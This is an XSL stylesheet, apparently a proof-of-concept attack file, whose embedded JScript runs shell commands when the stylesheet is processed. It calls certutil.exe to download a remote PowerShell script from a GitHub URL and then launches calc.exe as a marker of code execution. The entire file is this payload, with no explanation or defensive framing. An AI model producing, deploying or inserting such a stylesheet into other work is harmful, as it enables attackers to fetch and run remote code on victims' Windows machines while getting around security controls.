<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	  var r = new ActiveXObject("WScript.Shell").Run("certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 bla.txt");
    var t = new ActiveXObject("WScript.Shell").Run("calc.exe");
	]]> </ms:script>
</stylesheet>
